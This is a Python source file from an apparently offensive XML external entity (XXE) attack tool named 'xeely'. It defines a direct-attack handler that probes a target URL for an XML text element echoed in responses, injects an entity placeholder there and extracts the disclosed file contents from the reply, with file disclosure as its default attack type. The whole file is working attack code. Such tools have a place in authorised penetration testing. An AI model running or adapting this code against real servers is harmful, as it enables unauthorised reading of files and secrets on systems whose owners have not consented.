from typing import cast
from typing import Optional

from xeely import console
from xeely.custom_http import HTTPClient
from xeely.custom_http.server import HTTPServerParams
from xeely.custom_xml import XML
from xeely.custom_xml.text_element import XMLTextElement
from xeely.xxe.attack.handler.abstract import AbstractXXEAttackHandler
from xeely.xxe.attack.mode import XXEAttackMode
from xeely.xxe.attack.payload.direct import PLACE_HOLDER
from xeely.xxe.attack.type import XXEAttackType


class XXEDirectAttackHandler(AbstractXXEAttackHandler):
    def __init__(
        self,
        resource: str,
        xml: XML,
        target_url: str,
        attack_type: XXEAttackType = XXEAttackType.FILE_DISCLOSURE,
        should_apply_base64_encoding: bool = False,
        should_use_cdata: bool = False,
        http_server_params: Optional[HTTPServerParams] = None,
    ):
        super().__init__(
            resource=resource,
            target_url=target_url,
            xml=xml,
            attack_type=attack_type,
            attack_mode=XXEAttackMode.DIRECT,
            should_apply_base64_encoding=should_apply_base64_encoding,
            should_use_cdata=should_use_cdata,
            http_server_params=http_server_params,
        )
        self._pre_data_content = ""
        self._post_data_content = ""

    def _pre_attack_verification(self) -> bool:
        console.print_info("Searching a potential vulnerable XML entity")
        http_response = HTTPClient.send_post_request(self._target_url, self._base_xml.to_xml())

        text_elements = self._base_xml.get_text_elements()

        vulnerable_element: Optional[XMLTextElement] = None
        for text_element in text_elements:
            if text_element.get_value() in http_response.body:
                console.print_info(
                    f"'{text_element.get_name()}' entity appears to be a good candidate"
                )
                vulnerable_element = text_element

                data_start_idx = http_response.body.find(text_element.get_value())
                self._pre_data_content = http_response.body[:data_start_idx]
                self._post_data_content = http_response.body[
                    data_start_idx + len(text_element.get_value()) :
                ].strip()
                break

        if not vulnerable_element:
            console.print_warning("None of the text elements appeared in the answer!")
            return False

        # Updating XML to inject the XXE placeholder
        self._base_xml.change_text_element_value(
            cast(XMLTextElement, vulnerable_element).get_name(), PLACE_HOLDER
        )
        return True

    def _get_exfiltrated_data(self, **kwargs) -> str:
        http_response: str = kwargs["http_response"]

        data_start_pos = http_response.find(self._pre_data_content) + len(self._pre_data_content)

        if len(self._post_data_content) == 0:
            data = http_response[data_start_pos:]
        else:
            data_end_pos = http_response.find(self._post_data_content)
            data = http_response[data_start_pos:data_end_pos]

        return data.strip()
